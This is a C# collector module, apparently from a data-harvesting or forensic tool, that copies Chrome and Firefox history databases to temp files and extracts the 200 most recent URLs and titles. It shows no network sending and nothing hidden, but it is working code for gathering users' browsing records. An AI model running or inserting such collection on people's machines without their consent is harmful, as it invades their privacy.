using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;

namespace LegalHarvest.Modules
{
    public class BrowserHistoryModule : ICollectorModule
    {
        public string ModuleName => "BrowserHistory";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            // Chrome
            string chromeHistory = Path.Combine(localAppData, @"Google\Chrome\User Data\Default\History");
            if (File.Exists(chromeHistory))
            {
                string tempDb = Path.GetTempFileName();
                File.Copy(chromeHistory, tempDb, true);
                try
                {
                    using (var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;"))
                    {
                        conn.Open();
                        string query = "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 200";
                        using (var cmd = new SQLiteCommand(query, conn))
                        using (var reader = cmd.ExecuteReader())
                            while (reader.Read())
                                items.Add(new CollectedItem { Category = "ChromeHistory", Name = reader["title"].ToString(), Value = reader["url"].ToString(), Timestamp = DateTime.Now });
                    }
                }
                finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
            }

            // Firefox
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string firefoxProfiles = Path.Combine(appData, "Mozilla", "Firefox", "Profiles");
            if (Directory.Exists(firefoxProfiles))
            {
                foreach (string dir in Directory.GetDirectories(firefoxProfiles))
                {
                    string placesDb = Path.Combine(dir, "places.sqlite");
                    if (!File.Exists(placesDb)) continue;
                    string tempDb = Path.GetTempFileName();
                    File.Copy(placesDb, tempDb, true);
                    try
                    {
                        using (var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;"))
                        {
                            conn.Open();
                            string query = "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 200";
                            using (var cmd = new SQLiteCommand(query, conn))
                            using (var reader = cmd.ExecuteReader())
                                while (reader.Read())
                                    items.Add(new CollectedItem { Category = "FirefoxHistory", Name = reader["title"].ToString(), Value = reader["url"].ToString(), Timestamp = DateTime.Now });
                        }
                    }
                    finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
                    break;
                }
            }
            return items;
        }
    }
}
